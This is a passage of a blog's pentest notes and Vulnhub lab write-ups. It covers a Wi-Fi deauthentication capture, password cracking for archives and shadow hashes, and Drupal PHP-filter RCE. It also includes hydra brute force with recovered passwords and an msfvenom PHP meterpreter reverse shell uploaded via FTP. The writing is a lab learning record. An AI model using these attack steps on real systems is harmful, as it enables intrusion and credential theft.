</span><span class='line'>13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.933402 Probe Response (community) [1.0<em> 2.0</em> 5.5<em> 11.0</em> 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
</span><span class='line'>13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown)
</span><span class='line'>13:06:21.991250 Authentication (Open System)-1: Successful
</span><span class='line'>13:06:21.992274 Authentication (Open System)-1: Successful
</span><span class='line'>13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.992795 Authentication (Open System)-2:
</span><span class='line'>13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.994834 Assoc Request (community) [1.0<em> 2.0</em> 5.5<em> 11.0</em> 18.0 24.0 36.0 54.0 Mbit]
</span><span class='line'>13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
</span><span class='line'>13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
</span><span class='line'>13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0)
</span><span class='line'>13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
</span><span class='line'>13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
</span><span class='line'>13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
</span><span class='line'>13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
</span><span class='line'>13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
</span><span class='line'>13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station</span></code></pre></td></tr></table></div></figure>
</li>
<li>Transfer a image:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>base64 flair.jpg
</span><span class='line'>Copy output
</span><span class='line'>vi flair
</span><span class='line'>Paste the clipboard
</span><span class='line'>base64 -d flair &gt; flair.jpg</span></code></pre></td></tr></table></div></figure></li>
<li>It&rsquo;s always important to find, what&rsquo;s installed on the box:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dpkg-query -l </span></code></pre></td></tr></table></div></figure>
or using wild cards
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dpkg-query -l &lsquo;perl<em>&rsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>Password Protected File:
<ul>x
<li>
ZIP File: run fcrackzip
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip -D -u -p /tmp/rockyou2.txt flag.zip
</span><span class='line'>
</span><span class='line'>-D, &ndash;dictionary:    Select dictionary mode. In this mode, fcrackzip will read passwords from a file, which must contain one password per line and should be alphabetically sorted (e.g. using sort(1)).
</span><span class='line'>-p, &ndash;init-password string :  Set initial (starting) password for brute-force searching to string, or use the file with the name string to supply passwords for dictionary searching.
</span><span class='line'>-u, &ndash;use-unzip: Try to decompress the first file by calling unzip with the guessed password. This weeds out false positives when not enough files have been given.</span></code></pre></td></tr></table></div></figure>
</li>
<li>
We can get the password hash of a password protected rar file by using rar2john
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root:~/Downloads]# rar2john crocs.rar
</span><span class='line'>file name: artwork.jpg
</span><span class='line'>crocs.rar:$RAR3$</em>1<em>35c0eaaed4c9efb9</em>463323be<em>140272</em>187245<em>0</em>crocs.rar<em>76</em>35:1::artwork.jpg</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>
<li>Data-URI: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs">https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs</a></li>
<li>We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -D localhost:9050 user@host
</span><span class='line'>
</span><span class='line'>     -D [bind_address:]port
</span><span class='line'>             Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection
</span><span class='line'>             is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5
</span><span class='line'>             protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports.  Dynamic port forwardings can also be specified in the configuration file.
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>
and
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>proxychains4 remmina</span></code></pre></td></tr></table></div></figure></li>
<li>If you have sql-shell from sqlmap, we can use
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>select load_file(&lsquo;/etc/passwd&rsquo;);</span></code></pre></td></tr></table></div></figure>
</li>
<li>If you have a truecrypt volume to open and crack it&rsquo;s password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>truecrack &ndash;truecrypt &lt;Truecrypt File&gt; -k SHA512 -w &lt;Wordlist_File&gt;</span></code></pre></td></tr></table></div></figure>
and Veracrypt to open the file.</li>
<li>Getting a reverse shell from:</p>

<p>Drupal:</p>

<p>Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module.Once enabled we need to give permission to use it so in people -> permissions check &ldquo;Use the PHP code text format&rdquo;</p>

<p>Next I create a new block (by going to Blocks, under the Structure menu) with the following content. I make sure to select PHP code from the Text format drop down.</p>

<p>Taken from <a href="https://g0blin.co.uk/droopy-vulnhub-writeup/">https://g0blin.co.uk/droopy-vulnhub-writeup/</a></p>

<p>Drupal settings file location: /var/www/html/sites/default/settings.php</li></p>

<p><li>
If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.
</li>
</lu>
</ol>
</li></p>

<p><ol>
Write-Ups of Vulnhub VM:
<li><strong>DE_ICE_S1_100</strong>:</p>

<p>Scenario provided on Vulnhub: The scenario for this LiveCD is that a CEO of a small company has been pressured by the Board of Directors to have a penetration test done within the company. The CEO, believing his company is secure, feels this is a huge waste of money, especially since he already has a company scan their network for vulnerabilities (using nessus). To make the BoD happy, he decides to hire you for a 5-day job; and because he really doesn&rsquo;t believe the company is insecure, he has contracted you to look at only one server - a old system that only has a web-based list of the company&rsquo;s contact information.</p>

<p>The CEO expects you to prove that the admins of the box follow all proper accepted security practices, and that you will not be able to obtain access to the box. Prove to him that a full penetration test of their entire corporation would be the best way to ensure his company is actually following best security practices.</p>

<p>Information provided on the webpage:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Here is a list of contact information for the various organizational bodies:
</span><span class='line'>FINANCIAL: For Problems with financial issues, please contact the HR Department:
</span><span class='line'>Head of HR: Marie Mary - <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x6d;&#x61;&#114;&#x79;&#109;&#64;&#104;&#x65;&#x72;&#111;&#116;&#46;&#110;&#x65;&#116;">&#109;&#x61;&#x72;&#x79;&#109;&#64;&#104;&#x65;&#114;&#111;&#x74;&#46;&#110;&#101;&#116;</a> (On Emergency Leave)
</span><span class='line'>Employee Pay: Pat Patrick - <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x70;&#97;&#116;&#x72;&#105;&#99;&#x6b;&#x70;&#64;&#104;&#x65;&#x72;&#x6f;&#x74;&#x2e;&#x6e;&#101;&#x74;">&#x70;&#x61;&#x74;&#114;&#105;&#x63;&#107;&#x70;&#64;&#x68;&#101;&#x72;&#x6f;&#x74;&#x2e;&#x6e;&#101;&#116;</a>
</span><span class='line'>Travel Comp: Terry Thompson - <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x74;&#x68;&#x6f;&#x6d;&#x70;&#x73;&#111;&#x6e;&#116;&#64;&#x68;&#101;&#x72;&#111;&#116;&#46;&#110;&#101;&#x74;">&#x74;&#x68;&#x6f;&#109;&#x70;&#115;&#111;&#x6e;&#116;&#64;&#x68;&#101;&#x72;&#x6f;&#116;&#46;&#110;&#x65;&#x74;</a>
</span><span class='line'>Benefits: Ben Benedict - <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#98;&#101;&#x6e;&#101;&#100;&#x69;&#x63;&#x74;&#x62;&#x40;&#x68;&#x65;&#114;&#x6f;&#x74;&#x2e;&#110;&#101;&#116;">&#98;&#x65;&#x6e;&#x65;&#100;&#105;&#99;&#x74;&#x62;&#64;&#104;&#101;&#114;&#111;&#x74;&#46;&#110;&#101;&#x74;</a>
</span><span class='line'>
</span><span class='line'>ENGINEERING: For the Engineering Department, we have the following information:
</span><span class='line'>Director of Engineering: Erin Gennieg - <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x67;&#101;&#110;&#110;&#105;&#101;&#x67;&#x65;&#x40;&#x68;&#101;&#114;&#111;&#x74;&#46;&#110;&#x65;&#116;">&#x67;&#101;&#110;&#x6e;&#x69;&#x65;&#x67;&#101;&#64;&#104;&#x65;&#114;&#111;&#116;&#46;&#x6e;&#101;&#x74;</a>
</span><span class='line'>Project Manager: Paul Michael - <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x6d;&#x69;&#x63;&#x68;&#97;&#x65;&#108;&#x70;&#x40;&#104;&#101;&#114;&#x6f;&#116;&#46;&#x6e;&#x65;&#x74;">&#x6d;&#105;&#x63;&#104;&#97;&#101;&#108;&#112;&#x40;&#x68;&#101;&#x72;&#111;&#x74;&#x2e;&#x6e;&#x65;&#x74;</a>
</span><span class='line'>Engineer Lead: Ester Long - <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#108;&#x6f;&#110;&#x67;&#101;&#x40;&#x68;&#101;&#114;&#x6f;&#x74;&#x2e;&#x6e;&#x65;&#116;">&#108;&#x6f;&#x6e;&#103;&#x65;&#64;&#x68;&#101;&#114;&#x6f;&#x74;&#46;&#110;&#x65;&#x74;</a>
</span><span class='line'>
</span><span class='line'>If you have any problems with this server, or need to change information, please contact the following people:
</span><span class='line'>Sr. System Admin: Adam Adams - <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#97;&#x64;&#x61;&#x6d;&#115;&#97;&#x40;&#x68;&#101;&#x72;&#111;&#116;&#46;&#x6e;&#101;&#x74;">&#x61;&#100;&#x61;&#x6d;&#x73;&#x61;&#64;&#104;&#x65;&#x72;&#111;&#x74;&#46;&#110;&#101;&#116;</a>
</span><span class='line'>System Admin (Intern): Bob Banter - <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x62;&#97;&#x6e;&#x74;&#101;&#114;&#x62;&#64;&#104;&#101;&#x72;&#x6f;&#x74;&#46;&#x6e;&#x65;&#116;">&#98;&#x61;&#x6e;&#x74;&#x65;&#114;&#x62;&#x40;&#104;&#x65;&#114;&#111;&#116;&#x2e;&#x6e;&#x65;&#116;</a>
</span><span class='line'>System Admin: Chad Coffee - <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#99;&#x6f;&#x66;&#x66;&#101;&#101;&#x63;&#x40;&#x68;&#101;&#114;&#111;&#116;&#x2e;&#x6e;&#101;&#x74;">&#99;&#x6f;&#x66;&#x66;&#101;&#101;&#x63;&#x40;&#104;&#x65;&#x72;&#x6f;&#116;&#x2e;&#110;&#x65;&#116;</a></span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s see what we can find, so here we get a list of name of few people in the organization from Financial, Engineering department. We also get the people whom to contact if there&rsquo;s any problem with this server which is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Sr. System Admin: Adam Adams - <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x61;&#x64;&#x61;&#109;&#x73;&#x61;&#x40;&#x68;&#101;&#x72;&#111;&#x74;&#x2e;&#x6e;&#101;&#x74;">&#97;&#x64;&#x61;&#109;&#115;&#x61;&#64;&#104;&#101;&#114;&#111;&#116;&#x2e;&#x6e;&#101;&#116;</a>
</span><span class='line'>System Admin (Intern): Bob Banter - <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x62;&#x61;&#110;&#116;&#101;&#x72;&#98;&#64;&#104;&#x65;&#x72;&#111;&#x74;&#46;&#110;&#x65;&#116;">&#98;&#x61;&#110;&#x74;&#101;&#114;&#x62;&#x40;&#104;&#101;&#114;&#x6f;&#116;&#x2e;&#110;&#x65;&#x74;</a>
</span><span class='line'>System Admin: Chad Coffee - <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#99;&#x6f;&#102;&#102;&#101;&#101;&#99;&#64;&#x68;&#101;&#114;&#111;&#x74;&#x2e;&#x6e;&#x65;&#x74;">&#x63;&#111;&#x66;&#102;&#101;&#101;&#99;&#x40;&#104;&#x65;&#x72;&#x6f;&#116;&#46;&#110;&#x65;&#116;</a></span></code></pre></td></tr></table></div></figure>
Now, based on Name, usernames can be created using superkojiman namemash script. However, in this case there are lot of person and lot of possible username. So, we need to think who are important users which will be the System administrators. Also, by the concept of new people don&rsquo;t know much about security and might have default passwords. Let&rsquo;s target the intern Bob Banter.</p>

<p>Running superkojiman namemash script on Bob Banter, we get
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python namemash.py name
</span><span class='line'>bobbanter
</span><span class='line'>banterbob
</span><span class='line'>bob.banter
</span><span class='line'>banter.bob
</span><span class='line'>banterb
</span><span class='line'>bbanter
</span><span class='line'>bbob
</span><span class='line'>b.banter
</span><span class='line'>b.bob
</span><span class='line'>bob
</span><span class='line'>banter</span></code></pre></td></tr></table></div></figure>
Now Let&rsquo;s see what are the open ports on the host:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
</span><span class='line'>25/tcp  open   smtp?
</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
</span><span class='line'>110/tcp open   pop3     Openwall popa3d
</span><span class='line'>143/tcp open   imap     UW imapd 2004.357</span></code></pre></td></tr></table></div></figure>
Brute force attack can be executed on ssh and pop3. Running ssh brute force / pop3 brute results in
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.100  192.168.1.100  110/tcp (pop3)  bbanter  bbanter             Password
</span><span class='line'>192.168.1.100  192.168.1.100  22/tcp (ssh)    bbanter  bbanter             Password</span></code></pre></td></tr></table></div></figure></p>

<p>Logging in as a bbanter user and checking /etc/passwd and /etc/group file
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>aadams:x:1000:10:,,,:/home/aadams:/bin/bash
</span><span class='line'>bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
</span><span class='line'>ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root::0:root
</span><span class='line'>wheel::10:root
</span><span class='line'>users::100:
</span><span class='line'>console::101:</span></code></pre></td></tr></table></div></figure>
We see found the actual usernames which can be brute forced, we also see that aadams is member of group 10 which is group named wheel.</p>

<p>So what&rsquo;s wheel group?
<ul>
<li>Control of su in PAM: If you want to protect su, so that only some people can use it to become root on your system, you need to add a new group &ldquo;wheel&rdquo; to your system (that is the cleanest way, since no file has such a group permission yet). Add root and the other users that should be able to su to the root user to this group. Then add the following line to /etc/pam.d/su:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   auth        requisite   pam_wheel.so group=wheel debug</span></code></pre></td></tr></table></div></figure>
This makes sure that only people from the group &ldquo;wheel&rdquo; can use su to become root. Other users will not be able to become root. In fact they will get a denied message if they try to become root</li>
</ul>
which essentially means we need to get password of aadams to become root. Other users (ccoffee or bbanter) won&rsquo;t be able to run su. Running the bruteforce attack on aadams, ccoffee by using rockyou/darkc0de, we get
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.100  192.168.1.100  110/tcp (pop3)  aadams   nostradamus         Password</span></code></pre></td></tr></table></div></figure>
Logging as aadams and using sudo, we can extract passwd and shadow file, combine them using unshadow and use john to crack it.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>aadams@slax:~$ id
</span><span class='line'>uid=1000(aadams) gid=10(wheel) groups=10(wheel)
</span><span class='line'>aadams@slax:~$ sudo cat /etc/shadow
</span><span class='line'>root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
</span><span class='line'>aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
</span><span class='line'>bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
</span><span class='line'>ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unshadow PASSWD-FILE SHADOW FILE
</span><span class='line'>unshadow passwd shadow
</span><span class='line'>root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
</span><span class='line'>aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:1000:10:,,,:/home/aadams:/bin/bash
</span><span class='line'>bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:1001:100:,,,:/home/bbanter:/bin/bash
</span><span class='line'>ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:1002:100:,,,:/home/ccoffee:/bin/bash</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>
<br>
<strong>Violator:</strong>
Nmap scans provides
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p- -A 192.168.56.102 -oA Violator -vv
</span><span class='line'>
</span><span class='line'>PORT   STATE SERVICE REASON         VERSION
</span><span class='line'>21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.5rc3
</span><span class='line'>80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>| http-methods:
</span><span class='line'>|<em>  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'>|</em>http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: I Say&hellip; I say&hellip; I say Boy! You pumpin' for oil or somethin'&hellip;?
</span></code></pre></td></tr></table></div></figure></p>

<p>Searching proftpd 1.3.5 in searchsploit provides you a exploit
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ProFTPd 1.3.5 - File Copy                                                                                                                                                                     | ./linux/remote/36742.txt
</span><span class='line'>ProFTPd 1.3.5 (mod_copy) - Remote Command Execution                                                                                                                                           | ./linux/remote/36803.py
</span><span class='line'>ProFTPD 1.3.5 - Mod_Copy Command Execution                                                                                                                                                    | ./linux/remote/37262.rb</span></code></pre></td></tr></table></div></figure>
Metasploit has a module which provides a shell
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>`&ldquo;
</span><span class='line'>On the webserver, we found a link to the wiki of Violator <a href="https://en.wikipedia.org/wiki/Violator_%28album%29.">https://en.wikipedia.org/wiki/Violator_%28album%29.</a> If we use cewl to generate a wordlist on the wiki, it will generate only one word list for example if &ldquo;Policy of Truth&rdquo; is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code and removing spaces and changing upper to lower, we were able to create a small wordlist of 400 words.</span></code></pre></td></tr></table></div></figure>
awk &lsquo;length($0)&lt;20&rsquo; quotes | awk &lsquo;length($0)>4&rsquo; | sed &rsquo;s/ //gi'| tr &lsquo;[:upper:]&rsquo; &lsquo;[:lower:]&rsquo; > wordlist.txt
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre>&lt;code class=&rdquo;><span class='line'>Using hydra to brute force the accounts</span></code></pre></td></tr></table></div></figure>
hydra -L usernames.txt -P wordlist.txt <a href="ftp://192.168.1.2">ftp://192.168.1.2</a>
Hydra v8.2 &copy; 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2016-07-29 01:31:29
[DATA] max 16 tasks per 1 server, overall 64 tasks, 570 login tries (l:5/p:114), ~0 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 192.168.1.2   login: dg   password: policyoftruth
[21][ftp] host: 192.168.1.2   login: af   password: enjoythesilence
[21][ftp] host: 192.168.1.2   login: mg   password: bluedress
[21][ftp] host: 192.168.1.2   login: aw   password: sweetestperfection
1 of 1 target successfully completed, 5 valid passwords found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2016-07-29 01:31:43
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>We can upload a php meterpreter reverse shell by using ftp </span></code></pre></td></tr></table></div></figure>
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 R > payload.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 947 bytes
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>`&ldquo;
</span><span class='line'>ftp 192.168.1.2
</span><span class='line'>Connected to 192.168.1.2.
</span><span class='line'>220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:192.168.1.2]
</span><span class='line'>Name (192.168.1.2:xx): dg
</span><span class='line'>331 Password required for dg
</span><span class='line'>Password:
</span><span class='line'>230 User dg logged in
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; cd /var/www/html
</span><span class='line'>250 CWD command successful
</span><span class='line'>ftp&gt; put payload.php
</span><span class='line'>local: payload.php remote: payload.php
</span><span class='line'>200 PORT command successful
</span><span class='line'>150 Opening BINARY mode data connection for payload.php
</span><span class='line'>226 Transfer complete
</span><span class='line'>947 bytes sent in 0.00 secs (37.6304 MB/s)</span></code></pre></td></tr></table></div></figure>
Setting up a exploit handler at LPORT 4444 and visiting the payload provides us the meterpreter shell. By logging to dg, we can see the sudo permissions of dg
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
